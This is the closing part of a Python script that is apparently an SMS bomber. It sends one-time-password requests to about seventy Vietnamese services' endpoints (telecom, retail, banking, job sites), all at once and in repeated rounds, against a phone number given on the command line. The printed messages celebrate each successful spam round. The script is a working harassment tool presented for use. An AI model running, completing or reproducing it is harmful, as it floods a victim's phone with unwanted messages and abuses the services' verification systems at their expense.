    response = requests.post('https://api.mobile.vieclam24h.vn/seeker/request-otp', headers=headers, json=json_data) 
import concurrent.futures
import time
import sys

functions = [
    tv360, myvt, vieon, goldenspoon, goldenspoon1, fahasha, PNJ, PNJ1, fptshop, bestex, 
    vndirect, mocha, vuihoc, hasaki, hacom, guardian, mytv, vinwonder, viettelpost, 
    vtsolution, cellphones, longchau, longchau1, ghtk, vuanem, vuanem1, monkeyjunior,
    medigozl, jobsgo, kymdan, liena, trungson, trungson1, vinschool,
    befood, prep, alf, alf1, momo, safecare, vinfastescooter, vkids, edupia, 
    ivnd, bibomart, Bibabo, ViettelMoney, fptid, aio, thoitrang188, 
    kkfashion, aeshop, robot, dkimu, otpmu, lote, upos, foodmap1, thuongdo, 
    unicar, highlands, h5vay, gas40, finzone, pharmart1, sigo, baoviet, truedoc,
    babilala, vieclam24h
]
def run(phone, i):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(fn, phone) for fn in functions]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as exc:
                print(f'Generated an exception: {exc}')

    print("Spam thành công lần :", i)
    for j in range(4, 0, -1):
        print(f"Vui lòng chờ {j} giây", end="\r")
        time.sleep(1)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python sms.py <phone_number> <count>")
        sys.exit(1)

    phone = sys.argv[1]  # Fetch phone number from command-line argument
    count = int(sys.argv[2])  # Fetch count from command-line argument

    for i in range(1, count + 1):
        run(phone, i)